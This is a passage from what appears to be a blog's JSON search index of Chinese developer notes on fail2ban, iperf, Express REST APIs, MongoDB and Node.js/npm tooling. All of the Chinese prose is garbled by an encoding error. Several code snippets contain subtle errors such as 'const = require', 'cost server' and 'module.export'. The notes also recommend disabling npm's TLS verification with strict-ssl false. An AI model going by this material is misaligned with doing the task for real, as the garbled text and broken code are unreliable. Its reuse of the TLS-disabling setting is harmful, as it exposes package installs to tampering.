fail2bané˜²æ­¢ddos fail2banä¿æŠ¤shadowsocks fail2ban-regex fail2ban-regex fail2ban-regex /var/log/auth.log /etc/fail2ban/filter.d/sshd.conf â€“print-all-matchedâ€“print-all-missedâ€“print-all-ignored sudo fail2ban-regex /var/log/nginx/access.log /etc/fail2ban/filter.d/nginx-x00.conf â€“print-all-matched åŒ¹é…æˆåŠŸ| 139.162.184.185 - - [29/Oct/2018:20:02:19 -0400] â€œ\\x15\\x03\\x03\\x00\\x02\\x01\\x00â€ 400 166 â€œ-â€œ â€œ-â€œ iperfæ˜¯linuxä¸‹çš„ä¸€ä¸ªæµ‹é€Ÿè½¯ä»¶ tcpå’Œudpéƒ½èƒ½cetcp:æœåŠ¡ç«¯:iperf -s å®¢æˆ·ç«¯iperf -c your_server_ip udp:iperf -us å®¢æˆ·ç«¯iperf -uc your_server_ip -b 100M //bæ˜¯bandwidthçš„æ„æ€ vpsæŒ‚ä¸‹è½½ã€‚æ³¨æ„transmissionæ¯æ¬¡ä¿®æ”¹è®¾ç½®æ–‡ä»¶sudo vim /etc/transmission-daemon/settings.jsonä¹‹å‰è¦å…ˆæŠŠtransmissionè¿™ä¸ªè¿›ç¨‹å…³æ‰ï¼Œä¸ç„¶è®¾ç½®æ–‡ä»¶ä¼šè¢«ä¿®æ”¹ã€‚å¦å¤–ï¼Œè®¾ç½®æ–‡ä»¶ä¸­æ˜¾ç¤ºçš„rpc-passwordå…¶å®æ˜¯hashä¹‹åçš„å€¼ï¼Œè®°ä½è‡ªå·±å®é™…ä¸Šå†™äº†ä»€ä¹ˆå°±å¥½ã€‚ base64çš„ç”¨æ³• base64 -d &lt;(curl -L -s https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt) å‚è€ƒå›½å¤–çš„è¶…çº§pingå¿«é€Ÿæ£€æµ‹ IP åœ°å€æ˜¯å¦å¯ç”¨è·¯ç”±å™¨é€æ˜ä»£ç†dnsmasqshadowsocks-libev fail2ban regè®¿é—®æ²¡æœ‰è¢«å°çš„å›½å¤–ç½‘ç«™æ‰€ä½¿ç”¨çš„IP","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"ä½¿ç”¨Nodeå’Œexpresså¼€å‘Restful API","date":"2017-12-10T16:20:16.000Z","path":"2017/12/10/2017-12-10-Restful-API-Prescription-with-node-express/","text":"ä¸€ä¸ªæœ€ç®€å•çš„express appå¦‚ä¸‹ï¼š var express = require(&#39;express&#39;); var app = express(); app.get(&#39;/&#39;, function(req, res){ res.send(&#39;hello world&#39;); }); app.listen(3000); 1. å®‰è£… yarn add express body-parser 2. é…ç½®MiddleWare(ä¸­é—´ä»¶)çš„æ¦‚å¿µï¼šä»Requeståˆ°responseä¹‹é—´çš„æµç¨‹ä¸­ï¼Œä»»ä½•ç»„ä»¶éƒ½å¯ä»¥å¯¹è¿™ä¸ªè¿‡ç¨‹ä¸­çš„æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œæ‰€ä»¥routerå…¶å®ä¹Ÿæ˜¯ä¸­é—´ä»¶ã€‚ä¸­é—´ä»¶éœ€è¦æ³¨æ„çš„å°±æ˜¯é¡ºåºå¾ˆé‡è¦ã€‚ 2.1 è·¯ç”±è®¾ç½®var router = express.Router([options]);//é¦–å…ˆåˆ›å»ºrouterå¯¹è±¡ï¼Œé»˜è®¤urlpathæ˜¯å¤§å°å†™ä¸æ•æ„Ÿçš„ router.use(&quot;/api&quot;,function(req,res){ return &quot;hey there&quot;; }); //æ‰€ä»¥è¿™ä¸ªrouterä¼šé»˜è®¤å¤„ç†æ‰€æœ‰/apiå¼€å¤´çš„è¯·æ±‚ï¼Œä½†æ˜¯åœ¨è¿™ä¸ªrouterå†…éƒ¨è¿˜æ˜¯åˆ†çš„æ¸…çš„ router.get(&quot;/&quot;,...) router.get(&quot;/detail&quot;,...) // ä¸Šé¢çš„ä¾‹å­ï¼Œrouterä¼šåŒ¹é…ä¸Šæ‰€æœ‰/apiå¼€å¤´çš„urlï¼Œ app.use(&#39;/apple&#39;, ...) will match â€œ/appleâ€, â€œ/apple/imagesâ€, â€œ/apple/images/newsâ€, and so on. app.use(function (req, res, next) { //pathé»˜è®¤æ˜¯&#39;/&#39;ï¼Œæ‰€ä»¥ä¸‹é¢è¿™ä¸ªrouterä¼šåŒ¹é…ä¸Šæ‰€æœ‰çš„è¯·æ±‚ console.log(&#39;Time: %d&#39;, Date.now()); next(); }); //æ˜ç¡®åŒºåˆ†getå’Œpost router.get(&#39;/&#39;, function(req, res, next)) { }; router.post(&#39;/&#39;,function(req,res,next)){ }; router.all() //è¿™ç§æ˜¯æ‰€æœ‰çš„HTTP METHODéƒ½æ¥å—çš„ 2.2 body-parserä¸€èˆ¬è¿™æ ·ä½¿ç”¨å°±è¡Œäº†,bodyParseråªæ˜¯æŒ‡æ˜äº†èƒ½å¤Ÿparseé‚£äº›content-typeçš„request body // parse application/x-www-form-urlencoded app.use(bodyParser.urlencoded({ extended: false })) // parse application/json app.use(bodyParser.json()) æ·»åŠ äº†bodyParserä¹‹åå°±èƒ½è·å–å®¢æˆ·ç«¯ä¼ æ¥çš„æ•°æ®äº† è·å–GETè¯·æ±‚çš„å‚æ•°æ¯”å¦‚ GET /student/getById/27 è¿™æ ·ä¸€ä¸ªgetè¯·æ±‚ app.get(&#39;/getById/:age&#39;,function(req,res){ res.send(req.params.age); }) è·å–POSTè¯·æ±‚çš„å‚æ•°åœ¨postManå‘èµ·postè¯·æ±‚ POST /api/personal?age=10 HTTP/1.1 Host: localhost:8080 Content-Type: application/x-www-form-urlencoded Cache-Control: no-cache Postman-Token: 79c6d9a1-de8d-3b0b-8d3d-0ed6e1910f69 name=Josn&amp;age=12 POSTè¯·æ±‚ä¸­çš„bodyæ•°æ®ä»req.bodyä¸­æ‹¿å°±å¥½äº† req.params // Object ï¼ŒJson.String = {} req.body // {name:&#39;Josn&#39;,age:&#39;12&#39;} //è¿™ä¸ªæ˜¯posté‡Œé¢å‘é€çš„bodyæ•°æ® req.query // {&quot;age&quot;,&quot;10&quot;} // æ˜¾ç„¶è¿™æ˜¯urlé‡Œé¢çš„query è·å–è¯·æ±‚å¤´req.header(headerName)console.log(JSON.stringify(req.headers)); 2.3 å¤„ç†responseå¯ä»¥è®¾ç½®headerä»€ä¹ˆçš„ /* GET /api/user */ much extra information you can set on its header app.get(&quot;/user&quot;,function (req,res) { res.set({ &#39;Content-Type&#39;: &#39;application/json&#39;, &#39;Content-Length&#39;: &#39;123&#39;, &#39;ETag&#39;: &#39;12345&#39;, &#39;Cache-Control&#39;: &#39;max-age=5&#39;, &quot;Access-Control-Allow-Origin&quot;: &#39;http://127.0.0.1:8080&#39; }); res.cookie(&#39;name&#39;, &#39;tobi&#39;, { domain: &#39;.example.com&#39;, path: &#39;/admin&#39;, secure: true }); console.log(&#39;response send&#39;); res.json({ &quot;name&quot;:&quot;John&quot;, &quot;age&quot;:10 }); }); å¯ä»¥ç›´æ¥ä¸€ä¸ª404æ‰“å›å»res.sendStatus(404) è¿˜å¯ä»¥é‡å®šå‘response.redirect(â€˜/allâ€™); //åœ¨æµè§ˆå™¨é‡Œé¢çœ‹ï¼Œresponseçš„headeræ˜¯è¿™æ ·çš„ HTTP/1.1 302 FoundX-Powered-By: ExpressLocation: /allVary: AcceptContent-Type: text/html; charset=utf-8Content-Length: 68Date: Sun, 14 Jan 2018 10:08:50 GMTConnection: keep-alive response.direction();å’Œwindow.location.hrefå·®ä¸å¤š åœ¨routerä¸­ä¸»è¦å°±æ˜¯ä¸šåŠ¡é€»è¾‘å¤„ç†äº†ï¼Œåœ¨æ‰€æœ‰çš„éœ€è¦è®¤è¯çš„æ¥å£å‰æ·»åŠ jwté‰´æƒå¤„ç†ï¼Œä½¿ç”¨ä¸‰ä¸ªå‡½æ•°çš„æ–¹æ³•ï¼Œä¾‹å¦‚ var jwt = require(&#39;express-jwt&#39;); app.get(&#39;/protected&#39;, jwt({secret: &#39;shhhhhhared-secret&#39;}), function(req, res) { if (!req.user.admin) return res.sendStatus(401); res.sendStatus(200); }); åœ¨ä¸šåŠ¡å¤„ç†ä¸­ä½¿ç”¨Promise router.get(&#39;/&#39;, auth.optional, function(req, res, next) { Promise.all([promise1,promise2]) .then(values =&gt; { return res.json({key1:values}); }).catch(next); } 2.4 é”™è¯¯å¤„ç†å››ä¸ªå‚æ•° app.use(function(err, req, res, next) { console.error(err.stack); res.status(500).send(&#39;Something broke!&#39;); }); 3 Serving static filesç…§è¯´serving static fileè¿™ç§äº‹åº”è¯¥äº¤ç»™nginxç±»ä¼¼çš„åå‘ä»£ç†æ¥åšï¼Œexpressåªæ˜¯æä¾›äº†ä¸€ç§é€‰æ‹©ã€‚ app.use(express.static(path.join(__dirname,&#39;public&#39;))) ç„¶ååœ¨å½“å‰ç›®å½•æ–°å»ºä¸€ä¸ªpublicæ–‡ä»¶å¤¹ï¼Œæ·»åŠ imgæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ä¸€å¼ porn.jpgã€‚æµè§ˆå™¨è®¿é—®ï¼š localhost:port/img/porn.jpg ã€‚ å°±èƒ½çœ‹åˆ°æ”¾è¿›å»çš„çš„é‚£å¼ å›¾ç‰‡äº†ã€‚ app.use(&#39;/jquery&#39;, express.static(__dirname + &#39;/node_modules/jquery/dist/&#39;)); app.use(express.static(__dirname + &#39;/public&#39;)); //è¿™æ ·çš„è¯­æ³•ä¹Ÿå¯ä»¥ è¿™æ„æ€å°±æ˜¯è¯·æ±‚/jqueryè¿™ä¸ªç›®å½•ä¸‹çš„èµ„æºå°±ç­‰äºè®¿é—®/node_modules/jquery/dist/ç›®å½•ä¸‹åŒåçš„èµ„æº express4.xçš„æ–‡æ¡£ä¸Šè¿˜æœ‰è¯¦å°½çš„è®¾ç½®: var options = { dotfiles: &#39;ignore&#39;, etag: false, extensions: [&#39;htm&#39;, &#39;html&#39;], index: false, maxAge: &#39;1d&#39;, redirect: false, setHeaders: function (res, path, stat) { res.set(&#39;x-timestamp&#39;, Date.now()) } } app.use(express.static(&#39;public&#39;, options)) 4. æ•°æ®åº“è¿æ¥mongooseæ˜¯è¿æ¥nodeå’Œmongodbçš„åº“ï¼Œå®˜æ–¹æ–‡æ¡£ const mongoose = require(&#39;mongoose&#39;); mongoose.connect(&#39;mongodb://localhost/test&#39;); const Cat = mongoose.model(&#39;Cat&#39;, { name: String }); const kitty = new Cat({ name: &#39;Zildjian&#39; }); kitty.save().then(() =&gt; console.log(&#39;meow&#39;)); çœ‹ä¸Šå»æŸ¥è¯¢å’Œpromiseæœ‰ç‚¹åƒï¼Œä½†ä¸è¦å½“åšPromise ç®€å•çš„sessionå¤„ç†: yarn add express cookie-parser express-session router.get(&quot;/&quot;, function(req, res, next) { if (req.session.user) { var user = req.session.user; var name = user.name; res.send(&quot;ä½ å¥½&quot; + name + &quot;ï¼Œæ¬¢è¿æ¥åˆ°æˆ‘çš„å®¶å›­ã€‚&quot;); } else { let user = { name: &quot;Chen-xy&quot;, age: &quot;22&quot;, address: &quot;bj&quot; }; req.session.user = user; res.send(&quot;ä½ è¿˜æ²¡æœ‰ç™»å½•ï¼Œå…ˆç™»å½•ä¸‹å†è¯•è¯•ï¼&quot;); } // res.render(&quot;index&quot;, { // title: &quot;the test for nodejs session&quot;, // name: &quot;sessiontest&quot; // }); }); 5. Deploying node app on linux serveråœ¨linux serverä¸Šä½¿ç”¨pm2 deploy node project nohup node /home/zhoujie/ops/app.js &amp; ## nohupå°±æ˜¯ä¸æŒ‚èµ·çš„æ„æ€( no hang up)ã€‚ ignoring input and appending output to nohup.out // è¾“å‡ºè¢«å†™å…¥å½“å‰ç›®å½•ä¸‹çš„nohup.outæ–‡ä»¶ä¸­ screen ## æ–°å¼€ä¸€ä¸ªscreen pm2npm install -g pm2pm2 start app.js Configure Nginx as a web server and reverse proxy for Nodejs application on AWS Ubuntu 16.04 server real world express backend serverç”¨swagger uiå†™åç«¯apiæ–‡æ¡£ï¼Œæåº¦ç®€å• å‚è€ƒNginx æ˜¯å‰ç«¯å·¥ç¨‹å¸ˆçš„å¥½å¸®æ‰‹ Express Api bookåœ¨NodeJsä¸­ç©è½¬protoBuffer","tags":[{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://haldir65.github.io/tags/å‰ç«¯/"}]},{"title":"MongoDBæ‰‹å†Œ","date":"2017-12-10T16:13:54.000Z","path":"2017/12/10/2017-12-10-MongoDB-recepies/","text":"MongoDBå¯ä»¥ä½œä¸ºSpring bootçš„æ•°æ®åº“DAOï¼Œä¹Ÿå¯ä»¥å’Œnodeå¹³å°çš„express moduleç»“åˆã€‚ä½œä¸ºåå°å¼€å‘çš„æ•°æ®åº“ï¼Œåº”ç”¨å¾ˆå¹¿ã€‚ å®‰è£…(windowså¹³å°ä¸‹)MongoDBé»˜è®¤è£…åˆ°Cç›˜çš„program filesæ–‡ä»¶å¤¹é‡Œé¢,éœ€è¦ä¸€ä¸ªdataæ–‡ä»¶å¤¹official on installationè¿™ä¸ªæ–‡ä»¶å¤¹ä¸ä¸€å®šè¦åœ¨cç›˜ï¼Œå¯ä»¥æ”¾fç›˜ï¼Œæ¯”å¦‚â€f://mongndb//dataâ€//è¿™æ ·å¯åŠ¨serveræ—¶è®°å¾—æŠŠâ€“dbpathä¼ ä¸€ä¸‹é»˜è®¤å®‰è£…çš„æ—¶å€™dbpathè¢«è®¾ç½®ä¸ºäº†â€c://data//dbâ€ï¼Œæ‰€ä»¥å¯èƒ½éœ€è¦åˆ›å»ºè¿™ä¸ªç›®å½• windowsä¸Šå¦‚æœä½œä¸ºä¸€é¡¹æœåŠ¡çš„è¯ï¼Œæ¯æ¬¡éƒ½ä¼šå¼€æœºè‡ªå¯ï¼Œå…³é—­æ–¹å¼ Go to your windows services.msc and set your mongoDB on manual. To start your DB open admin prompt net start mongodb. To stop it net stop mongodb. establish connection// start db server &quot;C:\\Program Files\\MongoDB\\Server\\3.4\\bin\\mongod.exe&quot; --dbpath d:\\test\\mongodb\\data // open another shell window to connect to server &quot;C:\\Program Files\\MongoDB\\Server\\3.4\\bin\\mongo.exe&quot; // then you can start interact with mongo db server é€ŸæŸ¥æ‰‹å†ŒTutorial, not officialMongooseæ•™ç¨‹å®˜æ–¹æ‰‹å†ŒMongoose CURDæ”¯æŒå¤šç§è¯­è¨€ç¯å¢ƒè°ƒç”¨mongodb api è¯­æ³•(ä¸åƒmysqlåé¢è¦è·Ÿä¸€ä¸ª;åˆ†å·,mongo shellå¹¶ä¸è¦æ±‚)ï¼š `rubyuse mydb ## åˆ›å»ºä¸€ä¸ªåmydbçš„æ•°æ®åº“db.createCollection(â€œstudentsâ€) ## åˆ›å»ºä¸€ä¸ªstudentsçš„collections(ç±»ä¼¼äºsqlçš„table)show databases ##æ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰dbshow collections ## æ˜¾ç¤ºå½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰collectionsdb.students.insert({name: â€˜Jsonâ€™,age: 22,title:[â€˜teacherâ€™,â€™professorâ€™,â€™versatileâ€™]}) ## å¾€æ•°æ®åº“é‡Œæ·»åŠ ä¸€æ¡æ•°æ®db.students.find().pretty() // æ˜¾ç¤ºstudentsçš„collectionä¸­çš„æ‰€æœ‰å…ƒç´ ï¼Œprettyåªæ˜¯å¥½çœ‹ç‚¹db.students.updateOne( { â€œnameâ€: â€œBobâ€ }, { $set: {â€œageâ€ : 99}} ); // UPDATEè¯­å¥ setdb.students.find( { age : { $gt:24, $lt: 28} } ) // QUERY è¯­å¥ greater than and less thandb.students.deleteOne( { â€œ_idâ€ : ObjectId(â€œ5a584a109f157d455472ff11â€) } ); // DELETE è¯­å¥ batchInserttry { db.products.insertMany( [ { item: â€œcardâ€, qty: 15 }, { item: â€œenvelopeâ€, qty: 20 }, { item: â€œstampsâ€ , qty: 30 } ] );} catch (e) { print (e);} ## åœ¨nodeç¯å¢ƒä¸‹å¯ä»¥ä½¿ç”¨ Mongoose // a wrapper around the mongo db interface schema definition ```js // correct var studentSchema = mongoose.Schema({ _id: String, name: String, age: Number }); // wrong var studentSchema = mongoose.Schema({ name: String, age: Number }); åœ¨linuxä¸Šå®‰è£…mongodb-serverä¼šå ç”¨200å¤šMBçš„ç£ç›˜ç©ºé—´ï¼ŒåŸå› æ˜¯dbä½¿ç”¨äº†journal fileï¼Œä½†è¿™ç§journal è¦åŒºåˆ«äºå®é™…çš„æ–‡ä»¶ï¼Œå¹¶æœªå†™å…¥å®é™…çš„æ–‡ä»¶å­˜å‚¨å…·ä½“çš„æ–‡ä»¶åå­—å¥½åƒå«WiredTigerLogä»€ä¹ˆçš„æ˜¯è¿™ä¹ˆæ‰¾å‡ºæ¥çš„ sudo find / -size +10M -exec du -h {} \\; | sort -n ===========================================================================// todo validate request data, error handling. Uploading Files to MongoDB With GridFS (Node.js App)","tags":[]},{"title":"nodejså­¦ä¹ è®°å½•","date":"2017-12-10T16:13:30.000Z","path":"2017/12/10/2017-12-10-node-js-cookbook/","text":"npm run start å®‰è£…windowsä¸Šçš„å®‰è£…ååˆ†æ–¹ä¾¿ï¼Œå°±è·Ÿå®‰è£…æ™®é€šè½¯ä»¶ä¸€æ ·ï¼Œä¸€è·¯ä¸‹ä¸€æ­¥ç‚¹ä¸‹å»å³å¯ã€‚ npm install -g grunt # å®‰è£…ï¼Œæˆä¸ºå…¨å±€(-g)moduleï¼Œä¿å­˜ä¸ºdev-dependencies(â€“save-dev) ç®€å†™ -D ä¸€ä¸ªæ„æ€npm install -g grunt â€“save # å®‰è£…ï¼Œä¿å­˜ä¸ºdependencies npm run dev # æ‰“å¼€å‘ç¯å¢ƒåŒ…npm run build # æ‰“releaseåŒ…node is based on chrome v8 engine,itâ€™s javaScript without the browser. npmçš„configurationéå¸¸æ–¹ä¾¿è®¾ç½®,é¦–å…ˆæ˜¯è®¾ç½®proxy npm config set strict-ssl falsenpm config set registry â€œhttp://registry.npmjs.org/&quot;npm config set proxy http://127.0.0.1:1080 ## ä»¥ä¸Šä¸‰å¥è¯è®¾ç½®ä»£ç†npm config list ##åˆ—å‡ºå½“å‰æ‰€æœ‰çš„è®¾ç½®npm config get stuff ##æ¯”å¦‚è¯´registryç­‰ç­‰ï¼Œå…¶å®è·Ÿgit é‚£ä¸€å¥—å¾ˆåƒçš„ ä¹Ÿæœ‰ç”¨æ·˜å®cnpmçš„åšæ³•: $ npm install -g cnpm â€“registry=https://registry.npm.taobao.org$ npm config set registry https://registry.npm.taobao.org$ cnpm install [name] ## è¿™æ ·å°±èƒ½å®‰è£…äº† npmä¹Ÿæ”¯æŒcommand argumentsæä¾›registryçš„æ–¹å¼ï¼Œäº²æµ‹ï¼Œä¸æ˜¯ä¸€èˆ¬çš„å¿«ï¼ŒğŸ˜¸ã€‚npm â€“registry https://registry.npm.taobao.org install -D babel-cli whats-the-difference-between-dependencies-devdependencies-and-peerdependenciesnpmæœ‰ä¸ªdependenciesçš„æ¦‚å¿µï¼Œæ­¤å¤–è¿˜æœ‰dev-dependenciesçš„æ¦‚å¿µï¼Œä¸»è¦çœ‹package.jsonè¿™ä¸ªæ–‡ä»¶ { &quot;name&quot;: &quot;foo&quot;, &quot;version&quot;: &quot;0.0.0&quot;, &quot;scripts&quot;: { &quot;dev&quot;: &quot;node build/dev-server.js&quot;, &quot;build&quot;: &quot;node build/build.js&quot;, &quot;test&quot;: &quot;&quot;, &quot;lint&quot;: &quot;eslint --ext .js,.vue src test/unit/specs test/e2e/specs&quot; }, &quot;dependencies&quot;: { &quot;axios&quot;: &quot;^0.15.3&quot;, &quot;jsonp&quot;: &quot;^0.2.1&quot; }, &quot;devDependencies&quot;: { &quot;webpack&quot;: &quot;^2.6.1&quot;, &quot;webpack-dev-middleware&quot;: &quot;^1.10.0&quot;, &quot;webpack-hot-middleware&quot;: &quot;^2.18.0&quot;, &quot;webpack-merge&quot;: &quot;^4.1.0&quot; } } /*scriptçš„æ„æ€æ˜¯è¾“å…¥npm run dev = node build/dev-server.js ç±»ä¼¼äº linuxä¸‹çš„alias*/ /*å‘ä¸Šç®­å¤´çš„æ„æ€æ˜¯å®‰è£…çš„æ—¶å€™ä¼šè‡ªåŠ¨å»æŸ¥æ‰¾å®‰è£…æœ€æ–°çš„minor versionã€‚å…³äºç‰ˆæœ¬å·ï¼Œç¬¬ä¸€ä½è¡¨ç¤ºmajor versionï¼Œmay incur code imcompatibility,ç¬¬äºŒä½è¡¨ç¤ºminor versionï¼Œä»£è¡¨new features,ç¬¬ä¸‰ä½è¡¨ç¤ºbug fixes.æ‰€ä»¥å‘ä¸Šç®­å¤´æ„å‘³ç€å®‰è£…æ—¶ä¸ä¼šåŠ¨ç¬¬ä¸€ä½ï¼Œåªä¼šå‡çº§ä¸ºç¬¬äºŒä½æœ€æ–°çš„ç‰ˆæœ¬*/ stackoverflowä¸Šçš„è§£é‡Š ç¤ºä¾‹app.js console.log(&#39;hello!&#39;); node app.jshello! åˆ›å»ºnode project npm initä¼šæç¤ºä¸€äº›ä¿¡æ¯ï¼Œç”Ÿæˆä¸€ä¸ªpackage.jsonæ–‡ä»¶ { &quot;name&quot;: &quot;test&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot; } mainæ˜¯æŒ‡ç¨‹åºçš„è¿è¡Œå…¥å£scriptæ˜¯æŒ‡å¯ä»¥è‡ªå·±è®¾ç½®å¯åŠ¨çš„å‘½ä»¤ï¼Œæœ‰ç‚¹åƒaliasæ¯”å¦‚ vue-cliçš„package.jsoné‡Œé¢å°±æ˜¯è¿™æ ·çš„ â€œdevâ€: â€œnode build/dev-server.jsâ€,â€œbuildâ€: â€œnode build/build.jsâ€ æ‰€ä»¥ç”¨æˆ·åªè¦è¾“å…¥ npm run devå°±ç­‰åŒäºnode build/dev-server.js const = require(&#39;http&#39;); // http is a core module ,so we do&#39;t need install const hostname = &#39;127.0.0.1&#39;; const port = 3000; cost server = http.createServer((req,res) =&gt; { res.statusCode = 200; res.setHeader(&#39;Content-type&#39;,&#39;text/plain&#39;); res.end(&#39;Hello there!&#39;); }); server.listen(port,hostname,() =&gt;{ console.log(&#39;Server started on port &#39;+ port); }) æ­¤æ—¶å»æµè§ˆå™¨ä¸­æ‰“å¼€â€™localhost:3000â€™ï¼Œä¼šè¿”å›â€™Hello there!â€™ æƒ³è¦è¿”å›ä¸€ä¸ªhtmlå¹¶åœ¨æµè§ˆå™¨ä¸­æ¸²æŸ“ï¼Œctrl+cåœæ­¢æœåŠ¡å™¨ï¼Œä¿®æ”¹ä»£ç å¦‚ä¸‹ã€‚ const http = require(&#39;http&#39;); const fs =require(&#39;fs&#39;); const hostname = &#39;127.0.0.1&#39;; const port = 3000; fs.readFile(&#39;index.html&#39;,(err,html) =&gt; { if (err) { throw err; } const server = http.createServer((req,res) =&gt; { res.statusCode = 200; res.setHeader(&#39;Content-type&#39;,&#39;text/html&#39;); res.write(html); res.end(); }); server.listen(port,hostname,() =&gt;{ console.log(&#39;Server started on port &#39;+ port); }) }) ç°åœ¨é‡æ–°è¿è¡Œnode indexï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œåœ¨3000ç«¯å£å°±èƒ½çœ‹åˆ°htmlç½‘é¡µäº†ã€‚ { &quot;name&quot;: &quot;api&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;app.js&quot;, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;dependencies&quot;: { &quot;body-parser&quot;: &quot;^1.18.2&quot; } } dependenciesé‡Œé¢å‘ä¸Šç®­å¤´è¡¨ç¤ºå®‰è£…æœ€æ–°çš„minor versionã€‚è€Œä½¿ç”¨â€*â€œå·çš„è¯å°±è¡¨ç¤ºæƒ³è¦ä½¿ç”¨latest version ä¸€äº›nodeè‡ªå¸¦çš„moduleæ¯”å¦‚fs,path,httpï¼Œè¿™äº›ä¸œè¥¿éƒ½æ˜¯ä¸éœ€è¦å®‰è£…çš„,bundled with node installationã€‚ path.join(__dirname,&#39;filename&#39;); // ./filename path.join(__dirname,&quot;..&quot;,filename); // ../filename ,go to parent directory Compile ES6 ES2017 Code to ES5 Code(è¿™éƒ¨åˆ†å±äºwebpackçš„å†…å®¹) npm install â€“save-dev webpack webpack-dev-server babel-core babel-loader babel-preset-envnpm install â€“save-dev babel-polyfill babel-preset-stage-0 ## ç”¨async awaitçš„è¯éœ€è¦å®‰è£…polyfill package.json { &quot;name&quot;: &quot;bable-assemble&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;main&quot;: &quot;index.js&quot;, &quot;scripts&quot;: { &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot;, &quot;build&quot;: &quot;webpack&quot;, &quot;start&quot;: &quot;webpack-dev-server --output-public-path=/build/&quot; }, &quot;author&quot;: &quot;&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;devDependencies&quot;: { &quot;babel-cli&quot;: &quot;^6.26.0&quot;, &quot;babel-core&quot;: &quot;^6.26.0&quot;, &quot;babel-loader&quot;: &quot;^7.1.2&quot;, &quot;babel-polyfill&quot;: &quot;^6.26.0&quot;, &quot;babel-preset-env&quot;: &quot;^1.6.1&quot;, &quot;babel-preset-es2015&quot;: &quot;^6.24.1&quot;, &quot;babel-preset-stage-0&quot;: &quot;^6.24.1&quot;, &quot;http-server&quot;: &quot;^0.10.0&quot;, &quot;webpack&quot;: &quot;^3.10.0&quot;, &quot;webpack-dev-server&quot;: &quot;^2.9.7&quot; } } outputçš„æ–‡ä»¶å¤¹åæœ‰äº›äººå–œæ¬¢å«distï¼Œæœ‰äº›äººç”¨buildã€‚éƒ½è¡Œï¼Œæ²¡æœ‰åŒºåˆ«çš„ã€‚ å¦‚æœæ‰‹åŠ¨æ•²webpackçš„è¯ï¼Œä¼šæç¤ºä½ æ‰¾ä¸åˆ°webpackï¼Œè¿™æ˜¯å› ä¸ºæ²¡æœ‰globally install webpack,webpackè¿˜åªæ˜¯ä¸ªlocal fileã€‚ è¿™ä¹Ÿå°±æ˜¯å†™åœ¨scripté‡Œé¢çš„åŸå› äº†: è®©npmå»node_modulesé‡Œé¢æ‰¾ä¸€ä¸ªå«åšwebpackçš„ä¾èµ–ï¼Œç„¶åè¿è¡Œwebpackã€‚ webpack.config.js const path = require(&#39;path&#39;); module.exports = { entry:{ app:[&#39;babel-polyfill&#39;,&#39;./src/app.js&#39;] }, output:{ path:path.resolve(__dirname,&quot;build&quot;), filename:&quot;app.bundle.js&quot; }, module:{ loaders:[ { test:/\\.js?$/, exclude:/node_modules/, loader:&quot;babel-loader&quot;, query:{ presets:[&#39;env&#39;] } } ] } }; yarnyarn æ˜¯facebookè®¾è®¡çš„ï¼Œyarnçš„é€Ÿåº¦è¦æ¯”npmå¿«ã€‚åœ¨windowså¹³å°ä¸Šæ¨èä½¿ç”¨msiå®‰è£…åŒ…å®‰è£…ã€‚ npm install expressyarn add express è¿™ä¿©æ˜¯ä¸€æ ·çš„,ä¸€äº›å¸¸ç”¨çš„command yarn inityarn global add nodemonyarn outdatedyarn cache cleanyarn run dev // yarn dev å…¶å®runéƒ½å¯ä»¥çœç•¥yarn upgrade express eslintä¿®æ”¹é…ç½®ï¼Œè®©jsæ–‡ä»¶æ¯ä¸€è¡Œåé¢éƒ½å¾—åŠ å†’å·(allow semi colons)allow semi colons in javascript eslintåœ¨.eslintrcä¸­ï¼Œæ·»åŠ custom rules &quot;rules&quot;: { &quot;semi&quot;: [2, &quot;always&quot;] } node jsä¸æ”¯æŒes2015çš„import å’Œexportè¯­æ³•ï¼Œéœ€è¦ä½¿ç”¨muduleçš„è¯ï¼Œå¯ä½¿ç”¨commonJsï¼Œå³:å…¶å®è¿™äº‹è¯´æ¥å°±æ˜¯nodeå¯¹äºç»å¤§å¤šæ•°es2015çš„è¯­æ³•éƒ½æ”¯æŒäº†ï¼Œååimport,exportè¿™ä¸€å¥—å°±ä¸æ”¯æŒã€‚nodeç¤¾åŒºæœ€ç»ˆå†³å®šä½¿ç”¨mjsæ–‡ä»¶åç¼€ // library.js module.export.awesome = function () { consle.log(&#39;awesome&#39;); }; // index.js var library = require(&#39;./library&#39;); library.awesome(); // éœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼Œ // 1. require()åé¢è·Ÿçš„è·¯å¾„æ˜¯(&#39;./library&#39;)ï¼Œæ˜¯æŒ‡åœ¨å½“å‰è·¯å¾„ä¸‹ï¼Œè€Œä¸æ˜¯åœ¨node_modulesé‚£ä¸ªå¤§çš„æ–‡ä»¶å¤¹é‡Œé¢æ‰¾ // 2. require(&#39;./library&#39;) å’Œrequire(&#39;./library.js&#39;)æ²¡æœ‰åŒºåˆ« sourcemapså¼€å‘è¿‡ç¨‹ä¸­ä½¿ç”¨çš„æ˜¯ES2015ä»£ç ï¼Œç¼–è¯‘ä¹‹åå°±æˆäº†éå¸¸é•¿çš„es5ä»£ç ï¼Œåœ¨æµè§ˆå™¨é‡Œé¢å‡ ä¹æ— 